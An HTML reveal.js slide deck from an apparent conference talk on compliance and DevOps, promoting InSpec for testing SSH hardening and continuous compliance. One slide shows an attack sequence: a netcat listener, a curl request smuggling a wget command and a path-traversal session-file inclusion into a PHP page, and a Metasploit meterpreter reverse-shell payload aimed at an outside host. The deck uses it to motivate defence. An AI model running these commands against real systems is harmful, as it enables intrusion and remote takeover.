<!doctype html>
<html lang="en">

  <head>
    <meta charset="utf-8">

    <title>Security and DevOps for High Velocity Organizations</title>

    <meta name="description" content="A framework for easily creating beautiful presentations using HTML">
    <meta name="author" content="Hakim El Hattab">

    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">

    <link rel="stylesheet" href="css/reveal.css">
    <link rel="stylesheet" href="css/theme/beige.css" id="theme">
    <link rel="stylesheet" href="css/present.css">

    <!-- Code syntax highlighting -->
    <link rel="stylesheet" href="lib/css/zenburn.css">
    <link rel="stylesheet" href="css/my.css" media="screen" charset="utf-8">

    <link rel="stylesheet" href="bower_components/highlightjs/styles/rainbow.css" id="theme">
    <script src="bower_components/highlightjs/highlight.pack.min.js" charset="utf-8"></script>

    <!-- Printing and PDF exports -->
    <script>
      var link = document.createElement( 'link' );
      link.rel = 'stylesheet';
      link.type = 'text/css';
      link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
      document.getElementsByTagName( 'head' )[0].appendChild( link );
    </script>

    <!--[if lt IE 9]>
    <script src="lib/js/html5shiv.js"></script>
    <![endif]-->
    <style media="screen">
      .col50 {
        width: 49%;
        display: inline-block;
      }
    </style>
  </head>

  <body>
    <div style="position: fixed; bottom: 1.5rem; right: 1.5rem; color: white; font-size: 1vw; z-index: 10000;" id="timenow">
    </div>
    <script type="text/javascript">
      function toHHMMSS(time) {
        var hours   = time.getHours();
        var minutes = time.getMinutes();
        var seconds = time.getSeconds();

        if (hours   < 10) {hours   = "0"+hours;}
        if (minutes < 10) {minutes = "0"+minutes;}
        if (seconds < 10) {seconds = "0"+seconds;}
        var time    = hours+':'+minutes+':'+seconds;
        return time;
      }

      setInterval(function(){
        var time = new Date();
        document.getElementById("timenow").innerHTML = toHHMMSS(time);1
      }, 1000)
    </script>

    <div class="reveal">

      <!-- Any section element inside of this container is displayed as a slide -->
      <div class="slides">

        <section data-background="bridge.jpeg">
          <h1 class="lightbg">Compliance &amp; DevOps</h1>
          <h3 class="lightbg">Bridging the gap</h3>
        </section>

        <!--
        Tell the personal story of how auditors came into our DevOps cloud
        project 5 years ago.
        * feeling: like a clash of worlds; going into a different country speaking a different language
        * process: traditional workflow, traditional processes; didn't go well with our DevOps approach
        * important:
        * result: learnings
        -->
        <section data-background="power.plant.jpg">
          <h2 class="lightbg">DevOps meets compliance</h2>
          <p class="lightbg">anno 2011</p>
        </section>

      <!--
        <section>
          <h2>Overview</h2>
          <ol style="text-align:left">
            <li>Compliance 101</li>
            <li>Bridging the gap</li>
            <li>Continuous compliance</li>
          </ol>
        </section>
      -->

        <!-- <section>
          <h3 style="text-transform: lowercase;">$> whoami</h3>
          <div class="col50">
            <p>Dominik Richter</p>
            <p style="font-size: smaller">Product Manager at Chef</p>
            <ul class="vertical-list" style="font-size: smaller; text-align:center">
              <li>
                <a href="https://twitter.com/arlimus"><i class="icon-twitter"></i>@arlimus</a> <a href="https://github.com/arlimus"><i class="icon-github-circled"></i>arlimus</a>
              </li>
            </ul>
          <div>
        </section> -->

        <!-- <section>
          <h1>1. Compliance 101</h1>
        </section> -->

        <section data-background="morris.worm.jpg">
          &nbsp;
          <p style="font-size: small; color: #888">
            Source: <a src="https://flic.kr/p/gYnnPg">Intel Free Source on flick</a>
          </p>
        </section>

        <section>
          <p>Security vulnerabilities gave rise to IT compliance</p>
          <ul class=spacelist style="width: 70%">
            <li >1988 Morris Worm<span class=fragment>, National Bank Chicago 70$mio theft</span></li>
            <li class=fragment>1994 Citibank 10$mio hack, AOHell</li>
            <li class=fragment>1996 Brotherhood hacks Canadian Broadcast Corp.</li>
            <li class=fragment>1998 Free Mitnick Logic Bomb; Security incidents at 75% of organizations</li>
          </ul>
        </section>

        <section>
          <h2>State of security in YYYY</h2>
          <ul class=spacelist style="width: 70%">
            <li >In 60% of cases, attackers can compromise organizations within minutes.</li>
            <li class=fragment>99.9% of the exploited vulnerabilities were compromised more than a year after the vulnerability was published.</li>
            <li class=fragment>Ten vulnerabilities account for 97% of the exploits observed.</li>
          </ul>
          <small>Verizon Data Breach Report</small>
        </section>

        <section>
          <h2>State of security in 2014</h2>
          <ul class=spacelist style="width: 70%">
            <li>In 60% of cases, attackers can compromise organizations within minutes.</li>
            <li>99.9% of the exploited vulnerabilities were compromised more than a year after the vulnerability was published.</li>
            <li>Ten vulnerabilities account for 97% of the exploits observed.</li>
          </ul>
          <small>Verizon Data Breach Report</small>
        </section>

				<section>
          <h2>Cycle of regulation</h2>
          <img src="regulation.loop.png" alt="Regulation Loop"/>
        </section>

        <section>
          <h2>Compliance and security</h2>
          <img src="compliance-v-security.png" alt="Compliance v Security" style="width: 50%"/>
        </section>

        <section>
          <p>Offer baseline security and isolation layers</p>
          <pre>
            <code class="hljs bash wrap">
# let's try some wget
nc -l 8888

curl 'http://192.168.1.2/expenses.php?ccc=wget%20http%3A%2F%2F192.168.1.10%3A8888' --cookie 'PHPSESSID=31468g1scu79qbp0lcjp85aj82; path=/; user=../../../../../../../../var/lib/php/session/sess_31468g1scu79qbp0lcjp85aj82%00'

msfpayload linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=5555 X > met

# copy met to /var/www and start apache
...
            </code>
          </pre>
        </section>

        <section>
          <h2>Regulatory compliance</h2>
          <table class="equi3">
            <tr><td>PCI-DSS</td> <td>Gramm-Leach-Bliley Act</td> <td>HIPAA</td></tr>
            <tr><td>Dodd-Frank</td> <td>ISO</td> <td>Sarbanes-Oxley</td></tr>
            <tr><td>HITECH</td> <td>Grundschutz</td> <td>European Central Bank Regulations</td></tr>
          </table>
        </section>

        <section data-background="compliance.doc.png">
          &nbsp;
        </section>

        <section data-background="writing.jpg">
          &nbsp;
          <ul class="fragment vertical-list" style="text-align: center; background: rgba(255,255,255,0.66); padding: 1em;">
            <li >Processes</li>
            <li class=fragment>Data storage / processing</li>
            <li class=fragment>Configuration</li>
            <li class=fragment>Vulnerability handling</li>
          </ul>
        </section>

        <!--
  * how to adress compliance in an organization effectively + rapidly
  * orgs struggle under the weight of technical debt
  * demonstrate transformational change
  * major gains via Compliance

  Why Compliance?
  * show statistics
  * it's still a problem / not solved

  Old workflow

  Technical Debt
  * config of old-school systems
  * nw + hw + sw automation

  Orgs Transformation
  * need to demonstrate this transformation
      -->

      <!--
      PART 1: LANGUAGE
      ================
      -->

      <section>
        <h2>Creating a new component</h2>
        <img src="compliance.users.devops.png" alt="DevOps users" style="clip: rect(0px,60px,200px,0px);"/>
      </section>

        <!-- <section>
          <h2>Codify system hardening</h2>
          <pre>
            <code class="hljs json">
{
    "name": "hardening",
    "description": "Secure our server",
    "json_class": "Chef::Role",
    "chef_type": "role",
    "run_list": [
        "recipe[os-hardening]",
        "recipe[ssh-hardening]"
        ...
            </code>
          </pre>
        </section> -->

        <section>
          <h2>System configuration in code</h2>
          <pre>
            <code class="hljs ruby">
template '/etc/ssh/sshd_config' do
  source 'opensshd.conf.erb'
  mode '0600'
  owner 'root'
  group 'root'
  variables(
    mac: SshMac.get_macs(node),
    kex: SshKex.get_kexs(node),
    cipher: SshCipher.get_ciphers(node),
    ...
            </code>
          </pre>
        </section>

        <section>
          <h2>The promise of the coded business</h2>
          <img src="codification.promises.png" alt="Codification promises" style="margin-top: -2rem;"/>
        </section>

        <section>
          <h2>Almost there</h2>
          <p>Test for assurance across your infrastructure and apps</p>
        </section>

				<section>
					<h3>Why infrastructure testing?</h3>
				</section>

				<section data-background="nuclear.jpeg">
					<h3 style="background: rgba(255,255,255,0.4);">Code breaks</h3>
					<p style="background: rgba(0,0,0,0.3); color: white; font-size: smaller;">normal accident theory</p>
				</section>

				<section data-background="#fff">
					<img src="dc.complexity.1.png" alt="DC complexity 1" style="box-shadow: none" />
				</section>

				<section data-background="#fff">
					<img src="dc.complexity.2.png" alt="DC complexity 2" style="box-shadow: none" />
				</section>

				<section data-background="#fff">
					<img src="dc.complexity.3.png" alt="DC complexity 3" style="box-shadow: none" />
				</section>

				<section>
					<h3>Why infrastructure testing?</h3>
					<h3 class="fragment">1. Reduce the number of defects</h3>
					<h3 class="fragment">2. Security and Compliance testing</h3>
				</section>

        <!--
        Operating at velocity has benefits in addition to agile, scalable compliance.
        The processes, culture and technology used for compliance at velocity also
        give an enterprise a level of velocity, scale and consistency that lets it
        compete in the digital age. We refer to such an enterprise as a “coded business”.
        -->
        <section data-background="silos.jpg">
          &nbsp;
        </section>

        <section>
          <h2>Security meets operations</h2>
          <img src="compliance.users.png" alt="Compliance users"/>
        </section>

        <section data-background="compliance.doc.png">
          &nbsp;
        </section>

        <section>
          <img src="different.languages.png" alt="Different language"/>
        </section>

        <section>
          <img src="bring.users.together.2.png" alt="Bringing users together"/>
        </section>

        <section>
          <h3>Documentation</h3>
          <quote>
            SSH supports two different protocol versions. The original version, SSHv1,
            was subject to a number of security issues. Please use SSHv2 instead to
            avoid these.
          </quote>
        </section>

        <section>
          <h3>Scripting tools</h3>
          <pre>
            <code class="hljs bash">
> grep "^Protocol" /etc/ssh/sshd_config | sed 's/Protocol //'
2
            </code>
          </pre>
        </section>

        <section>
          <h3>Testing a requirement</h3>
          <pre>
            <code class="hljs ruby">
describe sshd_config do
  its('Protocol') { should cmp 2 }
end
            </code>
          </pre>
        </section>

				<section data-background="#FFCC98">
					<h1>InSpec</h1>
				</section>

        <section>
          <h3>Compliance language</h3>
          <pre>
            <code class="hljs ruby">
control 'ssh-1234' do
  impact 1.0
  title 'Server: Set protocol version to SSHv2'
  desc "
    Set the SSH protocol version to 2. Don't use legacy
    insecure SSHv1 connections anymore...
  "

  describe sshd_config do
    its('Protocol') { should eq('2') }
  end
end
            </code>
          </pre>
        </section>

				<section>
					<img src="cis2inspec.png" alt="CIS to InSpec translation" />
				</section>

        <section>
          <h3><img src="same.stack.png" style="height: 1em; margin: 0; margin-bottom: -0.1em;"> Common language</h3>
          <ul class="vertical-list">
            <li class=fragment>Compliance requirements as code</li>
            <li class=fragment>Infrastructure automation as code</li>
            <li class=fragment>Application automation as code</li>
          </ul>
        </section>

        <section>
          <h3><img src="same.stack.png" style="height: 1em; margin: 0; margin-bottom: -0.1em;"> Silo-breaking</h3>
          <ul class="vertical-list">
            <li class=fragment>Build foundation for communication</li>
            <li class=fragment>Share knowledge and code</li>
            <li class=fragment>Codify agreements after audits</li>
          </ul>
        </section>

        <section>
          <h3>Profile foundation</h3>
          <img src="inheritance1.png" alt="Base profile for inheritance" />
        </section>

        <section>
          <h3>Make adjustments</h3>
          <img src="inheritance2.png" alt="Base profile inheritance" />
        </section>

        <section>
          <h3>Spread to other environments</h3>
          <img src="inheritance3.png" alt="More inheritance" />
        </section>

        <!--
        PART 2: WORKFLOW
        ================
        -->

        <section>
          <h1>Continuous compliance</h1>
        </section>

				<section>
          <h2>Create new artifacts</h2>
          <img src="old.workflow.1.png" alt="New artifact development flow" />
        </section>

        <section>
          <h2>To reach production</h2>
          <img src="old.workflow.png" alt="Development stopped by auditors" />
        </section>

        <section data-background="hoover.dam.jpg">
          &nbsp;
        </section>

        <section>
          <img src="compliance.v.velocity.1.png" alt="Compliance v Velocity 1" width="70%" />
        </section>
        <section>
          <img src="compliance.v.velocity.2.png" alt="Compliance v Velocity 2" width="70%" />
        </section>
        <section>
          <img src="compliance.v.velocity.3.png" alt="Compliance v Velocity 3" width="70%" />
        </section>

        <section>
          <img src="compliance.v.velocity.4.png" alt="Compliance v Velocity 4" width="90%" />
        </section>

        <!--
        <section>
          <h2>Competitive Advantage</h2>
          <img src="high.velocity.competitive.advantage.png" alt="Competitive Advantage" />
          <h6>Book: The High Velocity Edge - Steven J. Spears</h6>
        </section>
      -->

        <section>
          <h2>Continuous workflow</h2>
        </section>

        <section>
          <img src="compliance.workflow.png" alt="Compliance Workflow"/>
        </section>

        <section>
          <h2>Create and test early on</h2>
        </section>

        <section data-background="ssh-profile.png">
          &nbsp;
        </section>

        <section data-background="compliance-kitchen-test.png">
          &nbsp;
        </section>

        <section>
          <h2>Test continuously</h2>
        </section>

        <section data-background="delivery.integration.1.png">
          &nbsp;
        </section>

        <section>
          <h2>Deploy, Operate, Verify</h2>
        </section>

        <section data-background="ui.screenshot.png">
          &nbsp;
        </section>

        <section>
          <h2>Continuous workflow</h2>
          <img src="compliance.workflow.png" alt="Compliance Workflow"/>
        </section>

				<section data-background="race.cars.jpg">
					&nbsp;
				</section>

        <section>
          <h2>Safety at Velocity</h2>
          <ul class="vertical-list">
            <li class=fragment>Risk reduction when constantly changing your systems</li>
            <li class=fragment>As part of the workflow. Not after, not later.</li>
            <li class=fragment>Test for quality, Test for compliance</li>
          </ul>
        </section>

        <section>
          <h2>Fixing The Compliance Cycle</h2>
          <img src="compliance_cycle.png" alt="Fixing the compliance cycle" />
        </section>

        <section>
          <img src="work.together.png" alt="work together" />
        </section>

        <section>
          <h2>Join InSpec</h2>
          <h1><a href="https://github.com/chef/inspec" target="_blank">
            <i class="icon-github-circled"></i>
          </a></h1>
          <h6><a href="https://github.com/chef/inspec" target="_blank">github.com/chef/inspec</a></h6>
          <h6 style="font-size: 1.2vw"><a href="https://gitter.im/chef/inspec" target="_blank">gitter.im/chef/inspec</a></h6>
        </section>

        <section>
          <h2>Thank you</h2>
          <div style="width: 100%;">
            <div style="width: 47%; display: inline-block;">
              <ul class="vertical-list" style="font-size: smaller; display: block; text-align: center">
                <li>
                  <a href="https://twitter.com/arlimus"><i class="icon-twitter"></i>@arlimus</a>
                  <a href="https://github.com/arlimus"><i class="icon-github-circled"></i>arlimus</a>
                </li>
              </ul>
            </div>
          </div>
        </section>

      </div>

    </div>

    <script src="lib/js/head.min.js"></script>
    <script src="js/reveal.js"></script>

    <script>

      // Full list of configuration options available at:
      // https://github.com/hakimel/reveal.js#configuration
      Reveal.initialize({
        controls: true,
        progress: true,
        history: true,
        center: true,

        transition: 'none', // none/fade/slide/convex/concave/zoom

        // Optional reveal.js plugins
        dependencies: [
          { src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
          { src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
          { src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
          { src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
          { src: 'plugin/zoom-js/zoom.js', async: true },
          { src: 'plugin/notes/notes.js', async: true }
        ]
      });

    </script>

  </body>
</html>
